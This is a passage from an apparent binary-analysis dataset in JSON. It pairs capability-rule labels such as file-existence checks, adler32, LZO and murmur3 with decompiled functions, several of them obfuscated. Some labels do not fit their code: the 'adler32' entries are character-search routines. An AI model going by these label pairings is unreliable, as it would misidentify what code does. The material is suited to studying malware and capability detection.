fcn.00410dee(var_4h);\n        }\n        puVar4 = fcn.004125de();\n        *puVar4 = 0x22;\n        return 0;\n    }\n    if (uVar2 != 0) {\n        return var_4h;\n    }\n    if (arg_8h == 0) {\n        fcn.00410dee(var_4h);\n    }\ncode_r0x00412da5:\n    iVar3 = func_0x00679351();\n    return iVar3;\n}\n",
        "token_count": 561
    },
    "0041c21c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041c21c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    while( true ) {\n        iVar1 = fcn.00410ecb(arg_8h);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (*0x439954 == 0) break;\n        func_0x00500dbd(&stack0xfffffffc, uVar2);\n        uVar2 = uVar2 + 1000;\n        if (*0x439954 < uVar2) {\n            uVar2 = 0xffffffff;\n        }\n        if (uVar2 == 0xffffffff) {\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 180
    },
    "00424bef": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00424c39)\n\nint32_t __cdecl fcn.00424bef(uint32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    iVar2 = fcn.00422193(arg_8h);\n    if (iVar2 == -1) {\n        puVar3 = fcn.004125de();\n        *puVar3 = 9;\n        iVar2 = -1;\n    }\n    else {\n        iVar2 = func_0x0066e2ab(arg_8h, iVar2, arg_ch, 0, arg_10h);\n        if (iVar2 == -1) {\n            iVar2 = func_0x00509d50();\n            return iVar2;\n        }\n        puVar1 = *((arg_8h >> 5) * 4 + 0x439de0) + 4 + (arg_8h & 0x1f) * 0x40;\n        *puVar1 = *puVar1 & 0xfd;\n    }\n    return iVar2;\n}\n",
        "token_count": 261
    },
    "004288c5": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004288c5(int32_t arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    \n    if (arg_8h == -1) {\n        fcn.00427c12();\n    }\n    cVar1 = fcn.00403940(arg_8h, 0);\n    if (cVar1 != '\\0') {\n        fcn.004282b6(0, arg_8h, arg_ch);\n        fcn.004034f0(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "00428ffb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.00428ffb(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0041227b(0x14);\n    fcn.00429586(0);\n    iVar2 = *0x439bc4;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = iVar2;\n    arg_8h_00 = fcn.00427d3a();\n    iVar1 = fcn.00427e2e(arg_8h_00);\n    if ((iVar1 == 0) && (iVar2 == 0)) {\n        iVar2 = fcn.00428bfc(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar2 == -1) {\n            fcn.00410c86(\"bad cast\");\n            fcn.004111ef(unaff_EBP + -0x20, 0x433448);\n        }\n        iVar2 = *(unaff_EBP + -0x10);\n        *0x439bc4 = iVar2;\n        fcn.00427d71();\n        fcn.00429727(iVar2);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004295ae();\n    fcn.00412353();\n    return;\n}\n",
        "token_count": 404
    },
    "0042921a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.0042921a(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0041227b(0x14);\n    fcn.00429586(0);\n    iVar2 = *0x439bc8;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = iVar2;\n    arg_8h_00 = fcn.00427d3a();\n    iVar1 = fcn.00427e2e(arg_8h_00);\n    if ((iVar1 == 0) && (iVar2 == 0)) {\n        iVar2 = fcn.00429098(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar2 == -1) {\n            fcn.00410c86(\"bad cast\");\n            fcn.004111ef(unaff_EBP + -0x20, 0x433448);\n        }\n        iVar2 = *(unaff_EBP + -0x10);\n        *0x439bc8 = iVar2;\n        fcn.00427d71();\n        fcn.00429727(iVar2);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004295ae();\n    fcn.00412353();\n    return;\n}\n",
        "token_count": 404
    },
    "00429ca0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00429ca0(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t **ppuVar1;\n    uint8_t uVar2;\n    uint8_t **arg_8h_00;\n    uint *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004146d8(0x433610, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    arg_8h_00 = *(unaff_EBP + 0xc);\n    if (arg_8h_00 == NULL) {\n        puVar3 = fcn.004125de();\n        *puVar3 = 0x16;\n        fcn.00415a3c(0, 0, 0, 0, 0);\n        goto code_r0x00429d9b;\n    }\n    fcn.0041aab9(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    if ((*(arg_8h_00 + 3) & 0x40) == 0) {\n        uVar4 = fcn.0041a799(arg_8h_00);\n        if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {\n            iVar5 = 0x4367d8;\n        }\n        else {\n            iVar5 = (uVar4 & 0x1f) * 0x40 + *((uVar4 >> 5) * 4 + 0x439de0);\n        }\n        if ((*(iVar5 + 0x24) & 0x7f) == 0) {\n            if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {\n                iVar5 = 0x4367d8;\n            }\n            else {\n                iVar5 = (uVar4 & 0x1f) * 0x40 + *((uVar4 >> 5) * 4 + 0x439de0);\n            }\n            if ((*(iVar5 + 0x24) & 0x80) == 0) goto code_r0x00429d66;\n        }\n        puVar3 = fcn.004125de();\n        *puVar3 = 0x16;\n        fcn.00415a3c(0, 0, 0, 0, 0);\n        *(unaff_EBP + -0x1c) = 0xffffffff;\n    }\ncode_r0x00429d66:\n    if (*(unaff_EBP + -0x1c) == 0) {\n        ppuVar1 = arg_8h_00 + 1;\n        *ppuVar1 = *ppuVar1 + -1;\n        if (*ppuVar1 < 0) {\n            uVar4 = fcn.00418b7d(*(unaff_EBP + 8), arg_8h_00);\n        }\n        else {\n            uVar2 = *(unaff_EBP + 8);\n            **arg_8h_00 = uVar2;\n            uVar4 = uVar2;\n            *arg_8h_00 = *arg_8h_00 + 1;\n        }\n        *(unaff_EBP + -0x1c) = uVar4;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00429da4();\ncode_r0x00429d9b:\n    fcn.0041471d();\n    return;\n}\n",
        "token_count": 835
    },
    "004427c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004427c0(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t unaff_ESI;\n    uint var_8h;\n    \n    uVar1 = arg_8h - unaff_ESI;\n    if (((((arg_8h >> 0x1f) - (unaff_ESI >> 0x1f)) - (arg_8h < unaff_ESI)) - (uVar1 < 5)) + (0x7fffffff < uVar1 - 5) !=\n        0) {\n        return uVar1 - 5 & 0xffffff00;\n    }\n    uVar2 = func_0x004ec963(uVar1 + 0x7ffffffb);\n    uVar1 = func_0x006fbef4(uVar2);\n    return uVar1;\n}\n",
        "token_count": 200
    },
    "0045818b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0045818b(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    int32_t iVar3;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00450bc8(0x45d120, 0x10);\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.004548ce(1);\n    *(unaff_EBP + -4) = 0;\n    iVar3 = 3;\n    do {\n        *(unaff_EBP + -0x20) = iVar3;\n        if (*0x463fc0 <= iVar3) {\n            *(unaff_EBP + -4) = 0xfffffffe;\n            fcn.00458221();\n            fcn.00450c0d();\n            return;\n        }\n        piVar1 = *0x462fbc + iVar3 * 4;\n        if (*piVar1 != 0) {\n            iVar2 = *piVar1;\n            if ((*(iVar2 + 0xc) & 0x83) != 0) {\n                iVar2 = fcn.004587f4(iVar2);\n                if (iVar2 != -1) {\n                    *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 1;\n                }\n            }\n            if (0x13 < iVar3) {\n                func_0x0044b35b(*(iVar3 * 4 + *0x462fbc) + 0x20);\n                return;\n            }\n        }\n        iVar3 = iVar3 + 1;\n    } while( true );\n}\n",
        "token_count": 405
    },
    "004582da": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004582da(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    int32_t arg_8h_00;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00450bc8(0x45d140, 0x14);\n    *(unaff_EBP + -0x1c) = 0;\n    *(unaff_EBP + -0x24) = 0;\n    fcn.004548ce(1);\n    *(unaff_EBP + -4) = 0;\n    for (arg_8h_00 = 0; *(unaff_EBP + -0x20) = arg_8h_00,  arg_8h_00 < *0x463fc0; arg_8h_00 = arg_8h_00 + 1) {\n        piVar1 = *0x462fbc + arg_8h_00 * 4;\n        if ((*piVar1 != 0) && (iVar2 = *piVar1,  (*(iVar2 + 0xc) & 0x83) != 0)) {\n            fcn.00456c27(arg_8h_00, iVar2);\n            *(unaff_EBP + -4) = 1;\n            iVar2 = *(*0x462fbc + arg_8h_00 * 4);\n            if ((*(iVar2 + 0xc) & 0x83) != 0) {\n                if (*(unaff_EBP + 8) == 1) {\n                    iVar2 = fcn.00458292(iVar2);\n                    if (iVar2 != -1) {\n                        *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 1;\n                    }\n                }\n                else if (((*(unaff_EBP + 8) == 0) && ((*(iVar2 + 0xc) & 2) != 0)) &&\n                        (iVar2 = fcn.00458292(iVar2),  iVar2 == -1)) {\n                    *(unaff_EBP + -0x24) = 0xffffffff;\n                }\n            }\n            *(unaff_EBP + -4) = 0;\n            fcn.0045837c();\n        }\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004583ab();\n    fcn.00450c0d();\n    return;\n}\n",
        "token_count": 596
    },
    "0041dee0": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nuint32_t * fcn.0041dee0(uint32_t *param_1, char param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    \n    uVar1 = param_1 & 3;\n    while (uVar1 != 0) {\n        if (*param_1 == param_2) {\n            return param_1;\n        }\n        if (*param_1 == '\\0') {\n            return NULL;\n        }\n        uVar1 = param_1 + 1 & 3;\n        param_1 = param_1 + 1;\n    }\n    while( true ) {\n        while( true ) {\n            uVar1 = *param_1;\n            uVar4 = uVar1 ^ CONCAT22(CONCAT11(param_2, param_2), CONCAT11(param_2, param_2));\n            uVar3 = uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff;\n            puVar5 = param_1 + 1;\n            if (((uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff) & 0x81010100) != 0) break;\n            param_1 = puVar5;\n            if ((uVar3 & 0x81010100) != 0) {\n                if ((uVar3 & 0x1010100) != 0) {\n                    return NULL;\n                }\n                if ((uVar1 + 0x7efefeff & 0x80000000) == 0) {\n                    return NULL;\n                }\n            }\n        }\n        uVar1 = *param_1;\n        if (uVar1 == param_2) {\n            return param_1;\n        }\n        if (uVar1 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar1 >> 8;\n        if (cVar2 == param_2) {\n            return param_1 + 1;\n        }\n        if (cVar2 == '\\0') break;\n        cVar2 = uVar1 >> 0x10;\n        if (cVar2 == param_2) {\n            return param_1 + 2;\n        }\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar1 >> 0x18;\n        if (cVar2 == param_2) {\n            return param_1 + 3;\n        }\n        param_1 = puVar5;\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 591
    },
    "0044e380": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nuint32_t * fcn.0044e380(uint32_t *param_1, char param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    \n    uVar1 = param_1 & 3;\n    while (uVar1 != 0) {\n        if (*param_1 == param_2) {\n            return param_1;\n        }\n        if (*param_1 == '\\0') {\n            return NULL;\n        }\n        uVar1 = param_1 + 1 & 3;\n        param_1 = param_1 + 1;\n    }\n    while( true ) {\n        while( true ) {\n            uVar1 = *param_1;\n            uVar4 = uVar1 ^ CONCAT22(CONCAT11(param_2, param_2), CONCAT11(param_2, param_2));\n            uVar3 = uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff;\n            puVar5 = param_1 + 1;\n            if (((uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff) & 0x81010100) != 0) break;\n            param_1 = puVar5;\n            if ((uVar3 & 0x81010100) != 0) {\n                if ((uVar3 & 0x1010100) != 0) {\n                    return NULL;\n                }\n                if ((uVar1 + 0x7efefeff & 0x80000000) == 0) {\n                    return NULL;\n                }\n            }\n        }\n        uVar1 = *param_1;\n        if (uVar1 == param_2) {\n            return param_1;\n        }\n        if (uVar1 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar1 >> 8;\n        if (cVar2 == param_2) {\n            return param_1 + 1;\n        }\n        if (cVar2 == '\\0') break;\n        cVar2 = uVar1 >> 0x10;\n        if (cVar2 == param_2) {\n            return param_1 + 2;\n        }\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar1 >> 0x18;\n        if (cVar2 == param_2) {\n            return param_1 + 3;\n        }\n        param_1 = puVar5;\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 591
    },
    "00409b98": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409b98(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    \n    if (arg_8h == 0) {\n        return;\n    }\n    uVar2 = func_0x0065f003();\n    uVar1 = extraout_ECX;\n    for (uVar2 = uVar2 & 0xff; uVar2 != 0; uVar2 = uVar2 - 1) {\n        func_0x00609056(uVar1, arg_8h);\n        uVar1 = extraout_ECX_00;\n    }\n    func_0x006d6352(arg_8h);\n    return;\n}\n",
        "token_count": 175
    },
    "0059a5f9": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.0059a5f9(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t *unaff_ESI;\n    ulong uVar3;\n    \n    uVar3 = fcn.00617c74(0xf0a684fd);\n    iVar2 = uVar3 >> 0x20;\n    uVar1 = 0;\n    while (iVar2 != 0) {\n        uVar1 = uVar1 >> 8 ^ *(((*uVar3 ^ uVar1) & 0xff) * 4 + 0x7054f8) ^ 0x605939c1;\n        iVar2 = (uVar3 >> 0x20) + -1;\n        uVar3 = CONCAT44(iVar2, uVar3 + 1);\n    }\n    *unaff_ESI = ~uVar1;\n    return;\n}\n",
        "token_count": 199
    },
    "00409bd0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409bd0(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    \n    iVar2 = fcn.00407717();\n    if ((iVar2 != 0) && (*(iVar2 + 0xc) != 0)) {\n        uVar3 = fcn.00414b6e(*(iVar2 + 0xc));\n        if (arg_8h + 4U < uVar3) {\n            fcn.00414a2e(*(iVar2 + 0xc), (uVar3 - arg_8h) + -4);\n        }\n        else {\n            fcn.00410dee(*(iVar2 + 0xc));\n            *(iVar2 + 0xc) = 0;\n        }\n        return 1;\n    }\n    fcn.00405f5e();\n    pcVar1 = swi(3);\n    uVar4 = (*pcVar1)();\n    return uVar4;\n}\n",
        "token_count": 231
    },
    "0043f4c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043f4c0(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t unaff_ESI;\n    uint32_t uVar4;\n    uint var_8h;\n    int32_t var_4h;\n    \n    uVar3 = *(unaff_ESI + 0x20);\n    if (uVar3 != 0) {\n        var_4h = uVar3 * 4;\n        uVar4 = uVar3;\n        do {\n            var_4h = var_4h + -4;\n            uVar4 = uVar4 - 1;\n            iVar1 = *(var_4h + *(unaff_ESI + 0x18));\n            if (*(iVar1 + 4) == (arg_8h & 0xfffffffc)) {\n                if (uVar4 < *(unaff_ESI + 0x20)) {\n                    uVar2 = uVar4;\n                    if (uVar4 < *(unaff_ESI + 0x20) - 1) {\n                        do {\n                            *(*(unaff_ESI + 0x18) + uVar2 * 4) = *(*(unaff_ESI + 0x18) + 4 + uVar2 * 4);\n                            uVar2 = uVar2 + 1;\n                        } while (uVar2 < *(unaff_ESI + 0x20) - 1U);\n                    }\n                    *(unaff_ESI + 0x20) = *(unaff_ESI + 0x20) + -1;\n                }\n                if (iVar1 != 0) {\n                    fcn.0044d92f(iVar1);\n                }\n            }\n            uVar3 = uVar3 - 1;\n        } while (uVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 423
    },
    "0043f540": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043f540(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t unaff_ESI;\n    uint32_t uVar5;\n    uint var_8h;\n    int32_t var_4h;\n    \n    uVar5 = *(unaff_ESI + 0x20);\n    if (uVar5 != 0) {\n        var_4h = uVar5 * 4;\n        uVar4 = uVar5;\n        do {\n            var_4h = var_4h + -4;\n            uVar4 = uVar4 - 1;\n            piVar2 = *(var_4h + *(unaff_ESI + 0x18));\n            if ((*piVar2 == arg_8h) && (((arg_ch & 0xfffffffc) == 0 || (piVar2[1] == (arg_ch & 0xfffffffc))))) {\n                if (uVar4 < *(unaff_ESI + 0x20)) {\n                    uVar3 = uVar4;\n                    if (uVar4 < *(unaff_ESI + 0x20) - 1) {\n                        do {\n                            puVar1 = *(unaff_ESI + 0x18) + uVar3 * 4;\n                            *puVar1 = puVar1[1];\n                            uVar3 = uVar3 + 1;\n                        } while (uVar3 < *(unaff_ESI + 0x20) - 1U);\n                    }\n                    *(unaff_ESI + 0x20) = *(unaff_ESI + 0x20) + -1;\n                }\n                if (piVar2 != NULL) {\n                    fcn.0044d92f(piVar2);\n                }\n            }\n            uVar5 = uVar5 - 1;\n        } while (uVar5 != 0);\n    }\n    return;\n}\n",
        "token_count": 451
    },
    "004435f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004435f0(void)\n\n{\n    uint32_t uVar1;\n    uint32_t *unaff_EBP;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    \n    uVar1 = ~*unaff_EBP & ~unaff_EBP[1];\n    unaff_EBP[1] = uVar1;\n    *unaff_EBP = (in_NT & 1) * 0x4000 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 | (uVar1 < 0) * 0x80 |\n                 (uVar1 == 0) * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(uVar1 & 0xff) & 1U) == 0) * 4 |\n                 (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    return;\n}\n",
        "token_count": 301
    },
    "004b64cb": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.004b64cb(void)\n\n{\n    ulong uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint32_t unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t unaff_ESI;\n    uint *puVar5;\n    int32_t unaff_EDI;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint uStack4;\n    \n    uStack4 = 0xd11386b2;\n    fcn.00634fd4();\n    uVar1 = rdtsc();\n    *(unaff_EBP + -8) = uVar1 >> 0x20;\n    *(unaff_EBP + -4) = uVar1;\n    uVar2 = ~(*(unaff_EDI + -4) ^ unaff_EBX);\n    iVar3 = (uVar2 >> 2 | uVar2 << 0x1e) + 0x512a4732;\n    if (unaff_EBP + -8 <= &stack0x0000005c) {\n        uVar2 = unaff_EBP - 0x88U & 0xfffffffc;\n        puVar4 = uVar2 - 0x40;\n        *(uVar2 - 0x44) = unaff_EDI + -4;\n        *(uVar2 - 0x48) = unaff_ESI + (-iVar3 >> 3 | iVar3 * -0x20000000);\n        *(uVar2 - 0x4c) =\n             (in_NT & 1) * 0x4000 | SBORROW4(uVar2, 0x40) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n             (puVar4 < 0) * 0x80 | (puVar4 == NULL) * 0x40 | (in_AF & 1) * 0x10 |\n             ((POPCOUNT(puVar4 & 0xff) & 1U) == 0) * 4 | uVar2 < 0x40 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000\n             | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n        puVar5 = &uStack4;\n        for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar4 = *puVar5;\n            puVar5 = puVar5 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 680
    },
    "0053c532": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0053c532(uint32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    uVar1 = (*((-~param_1 ^ 0x719a3e34) - 5) ^ (-~param_1 ^ 0x719a3e34) - 1) + 0xd00cb306;\n    iVar2 = (uVar1 * 8 | uVar1 >> 0x1d) + 0x3fdb4947;\n    // WARNING: Could not recover jumptable at 0x0044674c. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*(0x53c48d - (iVar2 * 2 | iVar2 < 0)))();\n    return;\n}\n",
        "token_count": 178
    },
    "005a6249": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.005a6249(void)\n\n{\n    uint8_t uVar1;\n    uint8_t unaff_BL;\n    ushort *unaff_ESI;\n    int32_t unaff_EDI;\n    uint uStack4;\n    \n    uStack4 = 0xd11386b2;\n    fcn.00634fd4();\n    uVar1 = ~((*(unaff_EDI + -1) ^ unaff_BL) - 1 < '\\0');\n    *(&uStack4 + (uVar1 >> 1 | uVar1 << 7)) = *unaff_ESI;\n    return;\n}\n",
        "token_count": 135
    },
    "00617c74": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00617c74(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    iVar2 = (param_1 << 1 | param_1 < 0) + 0xda5ebf83;\n    uVar1 = -~(iVar2 * 2 | iVar2 < 0) ^ 0x77617dc2;\n    uVar1 = uVar1 << 1 | uVar1 < 0;\n    uVar1 = *(uVar1 - 4) ^ uVar1;\n    uVar1 = ~((uVar1 >> 3 | uVar1 << 0x1d) + 0x8d90baeb);\n    // WARNING: Could not recover jumptable at 0x005fccd8. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*((uVar1 >> 0x18 | (uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18) + 0x50c0a2))();\n    return;\n}\n",
        "token_count": 259
    },
    "006cd632": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.006cd632(void)\n\n{\n    uint32_t uVar1;\n    uint32_t unaff_EBX;\n    uint *unaff_EBP;\n    int32_t unaff_ESI;\n    int32_t unaff_EDI;\n    \n    fcn.0044cb74(0xb83ae49a);\n    *unaff_EBP = **unaff_EBP;\n    uVar1 = *(unaff_EDI + -4) ^ unaff_EBX;\n    uVar1 = 0xb773a30d -\n            ((uVar1 >> 0x18 | (uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18) + 0xc8dbe8b7);\n    // WARNING: Could not recover jumptable at 0x0069fd30. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*(unaff_ESI + (uVar1 * 4 | uVar1 >> 0x1e)))();\n    return;\n}\n",
        "token_count": 240
    },
    "0040f713": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040f713(uint32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h < 0x112) {\n        if (arg_8h == 0x111) {\n            iVar2 = fcn.0040a9c7(0, arg_ch >> 0x10 | 0xbd110000, 0, 0);\n            if (iVar2 == 0) {\n                return 0;\n            }\n            if (arg_14h != NULL) {\n                *arg_14h = 1;\n                return 1;\n            }\n            return 1;\n        }\n        if (0x2a < arg_8h) {\n            if ((arg_8h < 0x30) || (arg_8h == 0x39)) goto code_r0x0040f7a9;\n            if (arg_8h == 0x4e) {\n                var_8h = arg_14h;\n                var_4h = arg_10h;\n                uVar1 = fcn.0040a9c7(0, *(arg_10h + 8) & 0xffff | 0xbc4e0000, &var_8h, 0);\n                return uVar1;\n            }\n        }\n    }\n    else if ((0x113 < arg_8h) && ((arg_8h < 0x116 || (arg_8h == 0x210)))) {\ncode_r0x0040f7a9:\n        uVar1 = fcn.0040efff(arg_8h + 0xbc00, arg_ch, arg_10h, arg_14h);\n        return uVar1;\n    }\n    if (arg_8h - 0x132 < 7) {\n        var_4h = arg_8h - 0x132;\n        var_8h = arg_ch;\n        uVar1 = fcn.0040efff(0xbc19, 0, &var_ch, arg_14h);\n        if (*arg_14h != 0) {\n            return uVar1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 535
    },
    "004498b0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
